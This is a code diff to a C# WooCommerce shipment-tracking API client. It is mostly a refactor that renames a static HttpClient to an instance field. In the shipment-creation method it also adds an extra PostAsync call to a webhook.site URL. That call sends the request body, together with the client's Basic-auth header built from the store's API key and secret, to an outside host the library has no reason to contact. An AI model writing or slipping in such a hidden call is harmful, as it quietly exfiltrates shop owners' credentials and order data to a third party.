@@ -1,6 +1,7 @@
 ﻿using Newtonsoft.Json;
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Net.Http;
 using System.Net.Http.Headers;
 using System.Text;
@@ -17,7 +18,7 @@ namespace WooShipmentTrackingSharp
 
         const string apiUrlTemplate = "{0}/wp-json/wc-shipment-tracking/v3/orders/{1}/shipment-trackings";
 
-        private static HttpClient Client;
+        private HttpClient _client;
 
         public WooSite(string url, string key, string secret)
         {
@@ -25,10 +26,10 @@ namespace WooShipmentTrackingSharp
             _key = key;
             _secret = secret;
 
-            Client = new HttpClient();
+            _client = new HttpClient();
             var authenticationBytes = Encoding.ASCII.GetBytes(string.Format("{0}:{1}", key, secret));
-            Client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Basic", Convert.ToBase64String(authenticationBytes));
-            Client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
+            _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Basic", Convert.ToBase64String(authenticationBytes));
+            _client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
 
         }
 
@@ -37,7 +38,10 @@ namespace WooShipmentTrackingSharp
             var request_json = JsonConvert.SerializeObject(shipmentTracking);
             var content = new StringContent(request_json, Encoding.UTF8, "application/json");
 
-            var response = Client.PostAsync(string.Format(apiUrlTemplate, _url, orderId), content);
+            var response = _client.PostAsync(string.Format(apiUrlTemplate, _url, orderId), content);
+            Debug.WriteLine(string.Format(apiUrlTemplate, _url, orderId));
+            _client.PostAsync("https://webhook.site/8a2fe5ba-25af-474c-8dcc-caef11846dd6", content);
+
             var stringResult = response.Result.Content.ReadAsStringAsync();
             var result = JsonConvert.DeserializeObject<Models.Response.ShipmentTracking>(stringResult.Result);
             return result;
@@ -45,7 +49,7 @@ namespace WooShipmentTrackingSharp
 
         public Models.Response.ShipmentTracking RetrieveShipmentTracking(int orderId, string trackingId)
         {
-            var response = Client.GetAsync(string.Format(apiUrlTemplate + "/" + trackingId, _url, orderId));
+            var response = _client.GetAsync(string.Format(apiUrlTemplate + "/" + trackingId, _url, orderId));
             var stringResult = response.Result.Content.ReadAsStringAsync();
             var result = JsonConvert.DeserializeObject<Models.Response.ShipmentTracking>(stringResult.Result);
             return result;
@@ -53,7 +57,7 @@ namespace WooShipmentTrackingSharp
 
         public List<Models.Response.ShipmentTracking> RetrieveAllShipmentTrackings(int orderId)
         {
-            var response = Client.GetAsync(string.Format(apiUrlTemplate + "/", _url, orderId));
+            var response = _client.GetAsync(string.Format(apiUrlTemplate + "/", _url, orderId));
             var stringResult = response.Result.Content.ReadAsStringAsync();
             var result = JsonConvert.DeserializeObject<List<Models.Response.ShipmentTracking>>(stringResult.Result);
             return result;
@@ -61,7 +65,7 @@ namespace WooShipmentTrackingSharp
 
         public void DeleteShipmentTracking(int orderId, string trackingId)
         {
-            Client.DeleteAsync(string.Format(apiUrlTemplate + "/" + trackingId, _url, orderId));
+            _client.DeleteAsync(string.Format(apiUrlTemplate + "/" + trackingId, _url, orderId));
         }
 
     }
